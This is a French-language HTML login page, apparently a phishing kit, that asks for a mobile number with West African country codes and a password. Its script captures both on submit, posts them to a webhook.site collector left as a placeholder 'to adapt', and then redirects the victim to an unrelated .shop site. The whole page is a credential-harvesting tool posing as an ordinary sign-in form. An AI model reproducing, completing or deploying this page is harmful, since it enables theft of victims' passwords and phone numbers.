<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      margin-bottom: 10px;
    }

    label {
      display: block;
      margin-top: 20px;
      margin-bottom: 5px;
      color: #555;
    }

    .input-group {
      position: relative;
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      overflow: hidden;
    }

    .dropdown {
      position: relative;
      width: 100%;
    }

    .selected {
      padding: 12px;
      cursor: pointer;
      background: #fff;
      width: 100%;
    }

    .options {
      position: absolute;
      top: 100%;
      left: 0;
      right: 0;
      background: white;
      border: 1px solid #ccc;
      border-top: none;
      z-index: 10;
      display: none;
      max-height: 180px;
      overflow-y: auto;
    }

    .option {
      padding: 12px;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .option:hover {
      background: #f0f0f0;
    }

    input[type="text"],
    input[type="password"] {
      padding: 12px;
      border: none;
      flex: 1;
      outline: none;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background: #1e294e;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .footer-links {
      display: flex;
      justify-content: space-between;
      margin-top: 15px;
      font-size: 14px;
    }

    .footer-links a {
      text-decoration: none;
      color: #1e294e;
    }

  </style>
</head>
<body>

  <div class="container">
    <h2>Connexion</h2>

    <form id="login-form">
      <label for="phone">Numéro de portable</label>
      <div class="input-group">
        <div class="dropdown" id="dropdown">
          <div class="selected" id="selected">+225</div>
          <div class="options" id="options">
            <div class="option">+225</div>
            <div class="option">+226</div>
            <div class="option">+228</div>
            <div class="option">+229</div>
            <div class="option">+237</div>
          </div>
        </div>
        <input type="text" id="phone" name="phone" placeholder="Numéro de portable" required />
      </div>

      <label for="password">Mot de passe</label>
      <input type="password" id="password" name="password" placeholder="Mot de passe" required />

      <button type="submit">Se connecter</button>
      <div class="footer-links">
        <a href="#">Se rappeler</a>
        <a href="#">S'inscrire</a>
      </div>
    </form>
  </div>

  <script>
    const selected = document.getElementById('selected');
    const optionsContainer = document.getElementById('options');
    const options = document.querySelectorAll('.option');

    selected.addEventListener('click', () => {
      optionsContainer.style.display = optionsContainer.style.display === 'block' ? 'none' : 'block';
    });

    options.forEach(option => {
      option.addEventListener('click', () => {
        selected.textContent = option.textContent;
        optionsContainer.style.display = 'none';
      });
    });

    // Envoi vers webhook (à adapter)
    document.getElementById('login-form').addEventListener('submit', function (e) {
      e.preventDefault();

      const indicatif = selected.textContent.trim();
      const numero = document.getElementById('phone').value;
      const password = document.getElementById('password').value;

      const data = {
        phone: indicatif + numero,
        password: password
      };

      fetch("https://webhook.site/TON_WEBHOOK_ICI", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      }).then(() => {
        window.location.href = "https://bfa.afeatoncom.shop/";
      });
    });
  </script>

</body>
</html>
